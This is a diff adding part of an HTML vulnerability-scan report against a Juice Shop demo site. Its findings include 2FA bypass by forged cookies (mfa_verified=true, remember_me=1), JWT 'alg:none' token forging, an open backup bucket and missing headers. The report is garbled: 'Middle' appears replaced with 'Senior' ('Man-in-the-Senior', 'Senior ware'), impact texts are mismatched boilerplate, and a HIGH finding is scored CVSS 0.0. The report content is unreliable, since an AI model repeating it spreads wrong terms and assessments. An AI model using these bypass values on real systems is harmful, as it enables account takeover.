+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce 2FA completion check on ALL protected routes via Senior ware.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">2FA — Cookie Bypass (&#39;mfa_verified=true&#39;)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#10 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/dashboard</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Setting cookie mfa_verified=true bypasses 2FA entirely.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A07:2021 – Identification and Authentication Failures</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Cookie Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Cookie: mfa_verified=true → access granted to /dashboard</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing secure cookie flags allow attackers to steal session tokens via Cross-Site Scripting (XSS) or Man-in-the-Senior (MitM) attacks, leading to complete account takeover.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Set &#39;HttpOnly&#39;, &#39;Secure&#39;, and &#39;SameSite=Strict&#39; attributes on all sensitive cookies. Ensure the application enforces HTTPS strictly.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">CHAIN: JWT None Algorithm → Admin Privilege Escalation</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#11 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">JWT with &#39;alg:none&#39; or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control (Chained)</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Chain Engine</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Step 1: [XSS — Session Hijack Payload (Generated)] at https://juiceshop.akto.io
+Step 2: [Admin Dashboard — No Authentication Required] at https://juiceshop.akto.io/admin</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce RS256/ES256 algorithms. Reject &#39;none&#39; algorithm. Validate all JWT claims server-side. Use short expiration times.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">GCP Bucket</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#12 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://storage.googleapis.com/juiceshop-backup</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">GCP Bucket status: Open — https://storage.googleapis.com/juiceshop-backup</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">AdminHunter</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Accessible backup files can expose full database dumps, source code, credentials, and configuration secrets. This is a critical data exposure risk.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Remove all backup files from the web root. Store backups in a secure, non-public storage location with access controls.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">Missing Header: Content-Security-Policy</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#13 | CVSS 7.5</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">CSP prevents XSS and data injection attacks by controlling allowed resource sources.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Content-Security-Policy&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">Missing Header: Strict-Transport-Security</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#14 | CVSS 7.5</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">HSTS forces HTTPS connections and prevents SSL-stripping attacks.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Strict-Transport-Security&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">2FA — No Rate Limiting on OTP (Brute-force Possible)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#15 | CVSS 7.5</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Tested 7 OTP codes with no lockout or 429 response.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A07:2021 – Identification and Authentication Failures</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">2FA</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">No rate-limit after 7 attempts</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce max 5 attempts. Add exponential backoff and account lockout.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">2FA — Remember-Me Cookie Forgery (&#39;remember_me&#39;)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#16 | CVSS 7.5</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/dashboard</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Forged &#39;remember_me=1&#39; cookie bypasses 2FA for trusted device.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A07:2021 – Identification and Authentication Failures</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Cookie Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Cookie: remember_me=1</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing secure cookie flags allow attackers to steal session tokens via Cross-Site Scripting (XSS) or Man-in-the-Senior (MitM) attacks, leading to complete account takeover.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Set &#39;HttpOnly&#39;, &#39;Secure&#39;, and &#39;SameSite=Strict&#39; attributes on all sensitive cookies. Ensure the application enforces HTTPS strictly.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">2FA — OAuth/SSO May Bypass 2FA</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#17 | CVSS 7.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/auth/google</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">OAuth/SSO endpoint at &#39;/auth/google&#39; may log users in without 2FA. Social login commonly bypasses MFA if not explicitly enforced.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A07:2021 – Identification and Authentication Failures</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">2FA</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">OAuth endpoint: /auth/google → HTTP 200</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce 2FA for OAuth-authenticated users. Check MFA status post-OAuth login.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-high" style="margin-right:10px;">HIGH</span>
+          <span class="finding-title">CHAIN: CORS Misconfiguration → XSS → Session Theft</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#18 | CVSS 8.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim&#39;s session cookies to a controlled server via cross-origin fetch.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control (Chained)</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Chain Engine</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Step 1: [CORS Wildcard Origin] at https://juiceshop.akto.io
+Step 2: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#19 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api-docs/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 200</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Size: 3106 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#20 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/robots.txt</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 200</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Size: 28 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#21 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/.well-known</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 200</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Size: 8903 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#22 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/security.txt</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 200</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Size: 475 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#23 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/metrics</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 200</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Size: 25501 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">CORS Wildcard Origin</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#24 | CVSS 5.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server returns Access-Control-Allow-Origin: * — any origin can read responses.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
